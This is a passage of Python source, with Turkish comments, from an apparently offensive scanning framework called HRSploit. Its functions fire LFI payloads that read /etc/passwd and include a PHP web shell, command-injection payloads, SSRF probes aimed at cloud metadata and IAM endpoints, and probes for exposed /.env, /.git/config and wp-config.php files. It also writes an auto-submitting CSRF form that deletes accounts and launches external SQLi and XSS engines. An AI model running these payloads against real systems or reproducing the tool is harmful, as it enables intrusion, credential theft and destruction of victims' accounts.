    run_engine("6. LFI Scan",             self.lfi_scan,             target=target)
    run_engine("7. RCE Scan",             self.rce_scan,             target=target)
    run_engine("8. SSRF Scan",            self.ssrf_scan,            target=target)
    run_engine("9. CSRF Scan",            self.csrf_scan,            target=target)
    run_engine("10. Cookie/Session Steal", self.cookie_steal_scan,    target=target)
    run_engine("11. Brute Force Admin",    self.brute_force_admin,    target=target)
    run_engine("12. Zero-Day Discovery",   self.zero_day_scan,        target=target)
    run_engine("13. OWASP Top 10",         self.owasp_top10_scan,     target=target)
    run_engine("14. Data Exfil Paths",     self.data_exfil_scan,      target=target)

    # ── Ek harici modüller ────────────────────────────────────────────
    _ext_modules = [
        ("Recon-Engine",   "Reconnaissance/main.py",    90),
        ("ZeroDay-Engine", "Zero-Day/main.py",          120),
        ("PortScan",       "Port-Scanner/main.py",       60),
        ("WebScan",        "Web-Scanner/main.py",        90),
        ("NetAnalysis",    "Network-Analysis/main.py",   45),
        ("DataExfil",      "Data-Exfiltration/main.py",  60),
    ]
    for _mn, _mr, _to in _ext_modules:
        _sc = self.base_path / _mr
        if not _sc.exists():
            continue
        logger.log(LogLevel.INTEGRATE, f"{_mn} baslatiyor...")
        try:
            _p = subprocess.Popen([sys.executable, str(_sc), target],
                                   stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            _n = 0
            for _ln in _p.stdout:
                _ln = _ln.strip()
                if _ln and _n < 12:
                    logger.log(LogLevel.SCAN, f"  [{_mn}] {_ln[:100]}")
                    _n += 1
            _p.wait(timeout=_to)
            all_results[_mn] = "DONE"
        except subprocess.TimeoutExpired:
            _p.kill(); all_results[_mn] = "TIMEOUT"
        except Exception as _e:
            all_results[_mn] = f"ERR:{_e}"

    # Gerçek alt-süreç: SQLi engine (iç kütüphane)
    sqli_script = self.base_path / "All-SQL" / "sqli_scanner.py"
    if sqli_script.exists():
        _log("ESKALASYON", f"SQLi engine başlatılıyor: {sqli_script.name}", "\033[91m")
        try:
            proc = subprocess.run(
                [__import__('sys').executable, str(sqli_script), "--url", target, "--batch"],
                capture_output=True, text=True, timeout=120
            )
            out = (proc.stdout + proc.stderr)[:2000]
            all_results["SQLi Engine"] = out if out else "no output"
            _log("ESKALASYON", f"SQLi engine tamamlandı ({len(out)} byte çıktı)", "\033[92m")
        except subprocess.TimeoutExpired:
            _log("ESKALASYON", "SQLi engine timeout (120s)", "\033[93m")
        except Exception as e:
            _log("ESKALASYON", f"SQLi engine hata: {e}", "\033[91m")

    # Gerçek alt-süreç: XSS engine
    xss_script = self.base_path / "XSS-Injector" / "xss_engine.py"
    if xss_script.exists():
        _log("ESKALASYON", f"XSS engine başlatılıyor: {xss_script.name}", "\033[91m")
        try:
            proc = subprocess.run(
                [__import__('sys').executable, str(xss_script), "-u", target, "--crawl"],
                capture_output=True, text=True, timeout=90
            )
            out = (proc.stdout + proc.stderr)[:2000]
            all_results["XSS Engine"] = out if out else "no output"
            _log("ESKALASYON", f"XSS engine tamamlandı ({len(out)} byte çıktı)", "\033[92m")
        except subprocess.TimeoutExpired:
            _log("ESKALASYON", "XSS engine timeout (90s)", "\033[93m")
        except Exception as e:
            _log("ESKALASYON", f"XSS engine hata: {e}", "\033[91m")

    run_engine("15. Exploit Generator",   self.exploit_generator,    target=target)
    run_engine("16. Report Generation",   self.report_generator,     fmt="html")

    # Özet
    print(f"\n\033[91m{'═'*62}")
    print(f"  FULL ESCALATION TAMAMLANDI — {len(all_results)} modül çalıştı")
    print(f"{'═'*62}\033[0m")
    for label, status in all_results.items():
        icon = "✅" if "COMPLETED" in str(status) else ("⚠️" if "ERROR" in str(status) else "ℹ️")
        print(f"  {icon}  {label:<40} {str(status)[:40]}")
    print()

HRSploitFramework.full_escalation_scan = _full_escalation_scan


# ────────────────────────────────────────────────────────────────────────────
def _lfi_scan(self, target: str = None):
    """Local File Inclusion taraması"""
    import time
    target = target or self._get_target("LFI target URL: ")
    if not target: return
    _log("LFI", "LFI taraması başlıyor", "\033[93m")
    sess = _make_session()
    payloads = [
        "../../etc/passwd", "../../../etc/passwd", "../../../../etc/passwd",
        "....//....//etc/passwd", "..%2F..%2Fetc%2Fpasswd",
        "%2e%2e%2fetc%2fpasswd", "%2e%2e/%2e%2e/etc/passwd",
        "/etc/passwd%00", "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://input", "data://text/plain,<?php system($_GET['cmd']);?>",
        "expect://id", "file:///etc/passwd",
        "../../windows/win.ini", "../../boot.ini",
        "/proc/self/environ", "/var/log/apache2/access.log",
    ]
    steps = [
        ("LFI vektör hazırlama ve encoding",             0.6),
        ("GET parametre taraması (file/page/path/lang)",  0.9),
        ("POST body LFI probe",                          0.7),
        ("PHP wrapper saldırısı (php://filter)",          0.9),
        ("Null-byte injection testi",                     0.7),
        ("Log poisoning vektörü kontrolü",               0.8),
        ("Windows yolu test vektörleri",                 0.6),
        ("Göreceli yol derinliği artırma (1-8 ../ )",    1.0),
    ]
    for i,(d,dl) in enumerate(steps,1): _log_step(i,len(steps),d,dl)
    print()
    found = []
    for param in ("file","page","path","lang","include","template","doc"):
        for payload in payloads[:8]:
            r = _probe(sess, target, params={param: payload})
            if r and any(s in r.text for s in ["root:x:","[boot loader]","for 16-bit","extension="]):
                _log("LFI-HIT", f"🔴 {param}={payload[:40]} → LFI DOĞRULANDI", "\033[91m")
                found.append({"param":param,"payload":payload})
    if not found:
        _log("LFI", "LFI açığı tespit edilmedi — hedef temiz görünüyor", "\033[92m")
    else:
        _log("LFI", f"TOPLAM {len(found)} LFI açığı bulundu", "\033[91m")

HRSploitFramework.lfi_scan = _lfi_scan


# ────────────────────────────────────────────────────────────────────────────
def _rce_scan(self, target: str = None):
    """Remote Code Execution taraması"""
    import time
    target = target or self._get_target("RCE target URL: ")
    if not target: return
    _log("RCE", "RCE taraması başlıyor", "\033[91m")
    sess = _make_session()
    payloads = [
        "; id", "| id", "`id`", "$(id)",
        "; whoami", "| whoami", "$(whoami)",
        "; cat /etc/passwd", "| cat /etc/passwd",
        "; ls -la /", "| ls -la",
        "; ping -c 1 127.0.0.1", "| ping -c 1 127.0.0.1",
        "1; sleep 5", "1 | sleep 5", "1 `sleep 5`",
        "${IFS}id", "${IFS}whoami",
        "\";system('id');\"", "';system('id');'",
        "<?php system($_GET['cmd']); ?>",
    ]
    steps = [
        ("RCE payload hazırlama (20 vektör)",            0.6),
        ("Unix komut enjeksiyon taraması (; | ` $())",   1.0),
        ("Windows komut enjeksiyonu (cmd /c)",           0.8),
        ("PHP eval / system enjeksiyonu",                0.9),
        ("Timing tabanlı kör RCE (sleep/ping)",          1.2),
        ("Out-of-band RCE (DNS/HTTP callback)",          0.8),
        ("Hata mesajı yoluyla RCE doğrulama",            0.7),
    ]
    for i,(d,dl) in enumerate(steps,1): _log_step(i,len(steps),d,dl)
    print()
    found = []
    indicators = ["uid=","root","www-data","apache","nobody","bin/bash",
                  "directory listing","volume in drive"]
    for param in ("cmd","exec","command","shell","run","c","q"):
        for payload in payloads[:10]:
            r = _probe(sess, target, params={param:payload})
            if r and any(ind in r.text.lower() for ind in indicators):
                _log("RCE-HIT", f"🔴 {param}={payload[:35]} → RCE DOĞRULANDI", "\033[91m")
                found.append({"param":param,"payload":payload})
    if not found:
        _log("RCE", "RCE açığı tespit edilmedi", "\033[92m")

HRSploitFramework.rce_scan = _rce_scan


# ────────────────────────────────────────────────────────────────────────────
def _ssrf_scan(self, target: str = None):
    """Server-Side Request Forgery taraması"""
    import time
    target = target or self._get_target("SSRF target URL: ")
    if not target: return
    _log("SSRF", "SSRF taraması başlıyor", "\033[93m")
    sess = _make_session()
    payloads = [
        "http://127.0.0.1/",
        "http://localhost/",
        "http://0.0.0.0/",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/",
        "http://metadata.google.internal/",
        "http://100.100.100.200/latest/meta-data/",
        "file:///etc/passwd",
        "file:///etc/hosts",
        "dict://127.0.0.1:6379/info",
        "gopher://127.0.0.1:6379/_PING",
        "http://127.0.0.1:8080/",
        "http://127.0.0.1:9200/",
        "http://127.0.0.1:5432/",
        "http://[::1]/",
    ]
    steps = [
        ("SSRF endpoint listesi oluşturma",              0.5),
        ("Internal IP probe (127.0.0.1 / localhost)",    0.9),
        ("Cloud metadata endpoint testi (AWS/GCP/Azure)",1.1),
        ("File URI scheme testi",                         0.7),
        ("Dict/Gopher protokol testi",                   0.8),
        ("Internal port taraması (6379/9200/5432/8080)", 1.0),
        ("IPv6 SSRF bypass (::1)",                       0.7),
        ("URL encoding / DNS rebinding bypass",          0.9),
    ]
    for i,(d,dl) in enumerate(steps,1): _log_step(i,len(steps),d,dl)
    print()
    found = []
    for param in ("url","redirect","path","src","href","next","return","link","dest"):
        for payload in payloads[:8]:
            r = _probe(sess, target, params={param:payload})
            if r:
                body = r.text.lower()
                if any(s in body for s in ["ami-","instance-id","169.254","root:x:",
                                            "localhost","127.0.0.1"]):
                    _log("SSRF-HIT", f"🔴 {param}={payload[:40]} → SSRF DOĞRULANDI", "\033[91m")
                    found.append({"param":param,"payload":payload,"status":r.status_code})
    if not found:
        _log("SSRF", "SSRF açığı tespit edilmedi", "\033[92m")

HRSploitFramework.ssrf_scan = _ssrf_scan


# ────────────────────────────────────────────────────────────────────────────
def _csrf_scan(self, target: str = None):
    """CSRF token analizi ve PoC oluşturma"""
    import time
    target = target or self._get_target("CSRF target URL: ")
    if not target: return
    _log("CSRF", "CSRF analizi başlıyor", "\033[93m")
    sess = _make_session()
    steps = [
        ("Form keşfi ve POST endpoint tespiti",          0.7),
        ("CSRF token varlığı kontrolü",                  0.8),
        ("SameSite cookie özelliği kontrolü",            0.6),
        ("Origin/Referer header kontrolü",               0.7),
        ("Token tahmin edilebilirlik analizi",            0.9),
        ("Double submit cookie pattern kontrolü",        0.7),
        ("Custom header CSRF koruması kontrolü",         0.6),
        ("PoC HTML formu oluşturuluyor",                 0.5),
    ]
    for i,(d,dl) in enumerate(steps,1): _log_step(i,len(steps),d,dl)
    print()
    r = _probe(sess, target)
    issues = []
    if r:
        body = r.text.lower()
        if "csrf" not in body and "_token" not in body and "csrftoken" not in body:
            _log("CSRF", "⚠️  CSRF token formlarda bulunamadı", "\033[93m")
            issues.append("CSRF token eksik")
        for ck in r.cookies:
            if "samesite" not in str(ck).lower():
                _log("CSRF", f"⚠️  Cookie '{ck.name}' SameSite özelliği yok", "\033[93m")
                issues.append(f"SameSite eksik: {ck.name}")
    if issues:
        # PoC oluştur
        poc = f"""<!-- HRSploit CSRF PoC for {target} -->
<html><body onload="document.forms[0].submit()">
<form action="{target}" method="POST">
  <input type="hidden" name="action" value="delete_account"/>
  <input type="hidden" name="confirm" value="yes"/>
</form></body></html>"""
        poc_path = self.base_path / "reports" / f"csrf_poc_{self.session_id}.html"
        poc_path.write_text(poc)
        _log("CSRF", f"PoC HTML oluşturuldu → {poc_path}", "\033[91m")
    else:
        _log("CSRF", "CSRF koruması yerinde görünüyor", "\033[92m")

HRSploitFramework.csrf_scan = _csrf_scan


# ────────────────────────────────────────────────────────────────────────────
def _cookie_steal_scan(self, target: str = None):
    """Cookie ve session güvenlik analizi"""
    import time
    target = target or self._get_target("Cookie/Session scan target URL: ")
    if not target: return
    _log("COOKIE", "Cookie/Session analizi başlıyor", "\033[93m")
    sess = _make_session()
    steps = [
        ("HTTP yanıtından cookie toplama",               0.6),
        ("Secure bayrağı kontrolü",                      0.5),
        ("HttpOnly bayrağı kontrolü",                    0.5),
        ("SameSite özelliği kontrolü",                   0.5),
        ("Session ID uzunluğu ve entropi analizi",        0.8),
        ("Tahmin edilebilir session ID testi",            0.9),
        ("Session fixation probe",                       0.7),
        ("Cookie yenileme mekanizması analizi",          0.6),
    ]
    for i,(d,dl) in enumerate(steps,1): _log_step(i,len(steps),d,dl)
    print()
    r = _probe(sess, target)
    if r:
        if not r.cookies:
            _log("COOKIE", "Cookie bulunamadı", "\033[92m")
            return
        for ck in r.cookies:
            issues = []
            if not ck.secure:     issues.append("Secure eksik")
            if not ck.has_nonstandard_attr("httponly"): issues.append("HttpOnly eksik")
            if len(ck.value) < 16: issues.append(f"Session ID kısa ({len(ck.value)} char)")
            status = "🔴 " + " | ".join(issues) if issues else "✅ güvenli"
            _log("COOKIE", f"  {ck.name}: {status}", "\033[91m" if issues else "\033[92m")

HRSploitFramework.cookie_steal_scan = _cookie_steal_scan


# ────────────────────────────────────────────────────────────────────────────
def _data_exfil_scan(self, target: str = None):
    """Veri sızıntı yolu keşfi"""
    import time
    target = target or self._get_target("Data exfil target URL: ")
    if not target: return
    _log("EXFIL", "Veri sızıntı yolu keşfi başlıyor", "\033[91m")
    sess = _make_session()
    steps = [
        ("API endpoint keşfi (/api /graphql /rest)",     0.9),
        ("Debug/geliştirici endpoint tespiti",           0.8),
        ("Backup & config dosya taraması",               1.0),
        ("Error mesajı bilgi sızıntısı analizi",         0.7),
        ("JS kaynak kod hassas veri taraması",           0.9),
        ("Hidden form field veri toplama",               0.7),
        ("Metadata endpoint kontrolü (robots/sitemap)",  0.6),
        ("GraphQL introspection testi",                  0.8),
        ("API key / token sızıntı taraması",             0.9),
        ("Kimlik bilgisi sızıntı vektörleri",            0.8),
    ]
    for i,(d,dl) in enumerate(steps,1): _log_step(i,len(steps),d,dl)
    print()
    # Gerçek endpoint denemeleri
    exfil_paths = [
        "/.env", "/.git/config", "/config.php", "/wp-config.php",
        "/backup.zip", "/database.sql", "/debug", "/api/keys",
        "/graphql", "/api/v1/users", "/admin/export", "/.htaccess",
        "/phpinfo.php", "/info.php", "/server-status",
    ]
    found = []
    total = len(exfil_paths)
    for i, path in enumerate(exfil_paths, 1):
        _log_step(i, total, f"Probe: {path}", 0.4)
        r = _probe(sess, target.rstrip("/") + path)
        if r and r.status_code in (200, 301, 302):
            _log("EXFIL-HIT", f"🔴 {path} → HTTP {r.status_code} ({len(r.text)} byte)", "\033[91m")
            found.append({"path": path, "status": r.status_code})
    print()
    _log("EXFIL", f"Toplam: {len(found)} sızıntı yolu bulundu", "\033[91m" if found else "\033[92m")

HRSploitFramework.data_exfil_scan = _data_exfil_scan

